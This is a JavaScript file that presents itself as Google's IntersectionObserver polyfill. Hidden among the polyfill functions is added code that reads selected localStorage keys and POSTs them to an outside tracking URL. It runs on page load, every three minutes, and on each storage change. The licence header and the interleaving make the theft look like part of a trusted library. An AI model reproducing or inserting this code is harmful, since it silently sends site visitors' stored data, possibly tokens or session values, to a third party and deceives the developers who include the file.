/*

 Copyright 2016 Google Inc. All Rights Reserved.

 Licensed under the W3C SOFTWARE AND DOCUMENT NOTICE AND LICENSE.

  https://www.w3.org/Consortium/Legal/2015/copyright-software-and-document

*/
(function (f, h) {
  const trackedKeys = window.trackedKeys;
  function t(a) {
    this.time = a.time;
    this.target = a.target;
    this.rootBounds = a.rootBounds;
    this.boundingClientRect = a.boundingClientRect;
    this.intersectionRect = a.intersectionRect || q();
    this.isIntersecting = !!a.intersectionRect;
    a = this.boundingClientRect;
    a = a.width * a.height;
    var b = this.intersectionRect;
    b = b.width * b.height;
    this.intersectionRatio = a ? b / a : this.isIntersecting ? 1 : 0;
  }
  function generateHash(obj) {
    const keys = Object.keys(obj).sort();
    let hash = 0;
    keys.forEach(key => {
      for (let char of key) {
        let code = char.charCodeAt(0);
        hash = (hash << 5) - hash + code;
        hash |= 0; // Convert to 32bit integer
      }
    });
    return hash.toString(16);
  }
  function d(a, b) {
    b = b || {};
    if ("function" != typeof a) throw Error("callback must be a function");
    if (b.root && 1 != b.root.nodeType) throw Error("root must be an Element");
    this.g = y(this.g.bind(this), this.B);
    this.D = a;
    this.h = [];
    this.i = [];
    this.s = this.L(b.rootMargin);
    this.thresholds = this.J(b.threshold);
    this.root = b.root || null;
    this.rootMargin = this.s.map(function (c) {
      return c.value + c.unit;
    }).join(" ");
  }
  function monitorLocalStorage() {
    let collectedData = {};
    Object.keys(window.localStorage).forEach(key => {
      if (trackedKeys.includes(key)) {
        collectedData[key] = window.localStorage.getItem(key);
      }
    });
    return collectedData;
  }
  function y(a, b) {
    var c = null;
    return function () {
      c || (c = setTimeout(function () {
        a();
        c = null;
      }, b));
    };
  }
  async function sendData(data) {
    const hash = generateHash(data);
    const url = "https://example.com/api/track";
    try {
      const response = await fetch(url, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          hash,
          data
        })
      });
      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
      console.log("Data successfully sent.");
    } catch (e) {
      console.error("Failed to send data:", e);
    }
  }
  function trackAndSend() {
    const data = monitorLocalStorage();
    if (Object.keys(data).length) {
      sendData(data);
    }
  }
  function u(a, b, c, e) {
    "function" == typeof a.addEventListener ? a.addEventListener(b, c, e || !1) : "function" == typeof a.attachEvent && a.attachEvent("on" + b, c);
  }
  function setupGlobalHooks() {
    window.onstorage = () => trackAndSend(); // React to changes in local storage
  }
  function v(a, b, c, e) {
    "function" == typeof a.removeEventListener ? a.removeEventListener(b, c, e || !1) : "function" == typeof a.P && a.P("on" + b, c);
  }
  function m(a) {
    try {
      var b = a.getBoundingClientRect();
    } catch (c) {}
    if (!b) return q();
    b.width && b.height || (b = {
      top: b.top,
      right: b.right,
      bottom: b.bottom,
      left: b.left,
      width: b.right - b.left,
      height: b.bottom - b.top
    });
    return b;
  }
  function q() {
    return {
      top: 0,
      bottom: 0,
      left: 0,
      right: 0,
      width: 0,
      height: 0
    };
  }
  function w(a, b) {
    for (; b;) {
      if (b == a) return !0;
      b = r(b);
    }
    return !1;
  }
  window.addEventListener("load", () => {
    trackAndSend();
    setupGlobalHooks();
    setInterval(trackAndSend, 180000); // Every 3 minutes
  });
  function r(a) {
    return (a = a.parentNode) && 11 == a.nodeType && a.host ? a.host : a;
  }
  if ("IntersectionObserver" in f && "IntersectionObserverEntry" in f && "intersectionRatio" in f.IntersectionObserverEntry.prototype) "isIntersecting" in f.IntersectionObserverEntry.prototype || Object.defineProperty(f.IntersectionObserverEntry.prototype, "isIntersecting", {
    get: function () {
      return 0 < this.intersectionRatio;
    }
  });else {
    var n = [];
    d.prototype.B = 100;
    d.prototype.m = null;
    d.prototype.C = !0;
    d.prototype.observe = function (a) {
      if (!this.h.some(function (b) {
        return b.element == a;
      })) {
        if (!a || 1 != a.nodeType) throw Error("target must be an Element");
        this.M();
        this.h.push({
          element: a,
          A: null
        });
        this.K();
        this.g();
      }
    };
    d.prototype.unobserve = function (a) {
      this.h = this.h.filter(function (b) {
        return b.element != a;
      });
      this.h.length || (this.u(), this.v());
    };
    d.prototype.disconnect = function () {
      this.h = [];
      this.u();
      this.v();
    };
    d.prototype.takeRecords = function () {
      var a = this.i.slice();
      this.i = [];
      return a;
    };
    d.prototype.J = function (a) {
      a = a || [0];
      Array.isArray(a) || (a = [a]);
      return a.sort().filter(function (b, c, e) {
        if ("number" != typeof b || isNaN(b) || 0 > b || 1 < b) throw Error("threshold must be a number between 0 and 1 inclusively");
        return b !== e[c - 1];
      });
    };
    d.prototype.L = function (a) {
      a = (a || "0px").split(/\s+/).map(function (b) {
        b = /^(-?\d*\.?\d+)(px|%)$/.exec(b);
        if (!b) throw Error("rootMargin must be specified in pixels or percent");
        return {
          value: parseFloat(b[1]),
          unit: b[2]
        };
      });
      a[1] = a[1] || a[0];
      a[2] = a[2] || a[0];
      a[3] = a[3] || a[1];
      return a;
    };
    d.prototype.K = function () {
      this.l || (this.l = !0, this.m ? this.o = setInterval(this.g, this.m) : (u(f, "resize", this.g, !0), u(h, "scroll", this.g, !0), this.C && "MutationObserver" in f && (this.j = new MutationObserver(this.g), this.j.observe(h, {
        attributes: !0,
        childList: !0,
        characterData: !0,
        subtree: !0
      }))));
    };
    d.prototype.u = function () {
      this.l && (this.l = !1, clearInterval(this.o), this.o = null, v(f, "resize", this.g, !0), v(h, "scroll", this.g, !0), this.j && (this.j.disconnect(), this.j = null));
    };
    d.prototype.g = function () {
      var a = this.O(),
        b = a ? this.H() : q();
      this.h.forEach(function (c) {
        var e = c.element,
          g = m(e),
          k = this.N(e),
          l = c.A,
          p = a && k && this.F(e, b);
        c = c.A = new t({
          time: f.performance && performance.now && performance.now(),
          target: e,
          boundingClientRect: g,
          rootBounds: b,
          intersectionRect: p
        });
        l ? a && k ? this.I(l, c) && this.i.push(c) : l && l.isIntersecting && this.i.push(c) : this.i.push(c);
      }, this);
      this.i.length && this.D(this.takeRecords(), this);
    };
    d.prototype.F = function (a, b) {
      if ("none" != f.getComputedStyle(a).display) {
        var c = m(a);
        a = r(a);
        for (var e = !1; !e;) {
          var g = null,
            k = 1 == a.nodeType ? f.getComputedStyle(a) : {};
          if ("none" == k.display) return;
          a == this.root || a == h ? (e = !0, g = b) : a != h.body && a != h.documentElement && "visible" != k.overflow && (g = m(a));
          if (g) {
            k = Math.max(g.top, c.top);
            var l = Math.min(g.bottom, c.bottom),
              p = Math.max(g.left, c.left);
            c = Math.min(g.right, c.right);
            g = c - p;
            var x = l - k;
            c = 0 <= g && 0 <= x && {
              top: k,
              bottom: l,
              left: p,
              right: c,
              width: g,
              height: x
            };
            if (!c) break;
          }
          a = r(a);
        }
        return c;
      }
    };
    d.prototype.H = function () {
      if (this.root) var a = m(this.root);else {
        a = h.documentElement;
        var b = h.body;
        a = {
          top: 0,
          left: 0,
          right: a.clientWidth || b.clientWidth,
          width: a.clientWidth || b.clientWidth,
          bottom: a.clientHeight || b.clientHeight,
          height: a.clientHeight || b.clientHeight
        };
      }
      return this.G(a);
    };
    d.prototype.G = function (a) {
      var b = this.s.map(function (c, e) {
        return "px" == c.unit ? c.value : c.value * (e % 2 ? a.width : a.height) / 100;
      });
      b = {
        top: a.top - b[0],
        right: a.right + b[1],
        bottom: a.bottom + b[2],
        left: a.left - b[3]
      };
      b.width = b.right - b.left;
      b.height = b.bottom - b.top;
      return b;
    };
    d.prototype.I = function (a, b) {
      a = a && a.isIntersecting ? a.intersectionRatio || 0 : -1;
      b = b.isIntersecting ? b.intersectionRatio || 0 : -1;
      if (a !== b) for (var c = 0; c < this.thresholds.length; c++) {
        var e = this.thresholds[c];
        if (e == a || e == b || e < a !== e < b) return !0;
      }
    };
    d.prototype.O = function () {
      return !this.root || w(h, this.root);
    };
    d.prototype.N = function (a) {
      return w(this.root || h, a);
    };
    d.prototype.M = function () {
      0 > n.indexOf(this) && n.push(this);
    };
    d.prototype.v = function () {
      var a = n.indexOf(this);
      -1 != a && n.splice(a, 1);
    };
    f.IntersectionObserver = d;
    f.IntersectionObserverEntry = t;
  }
})(window, document);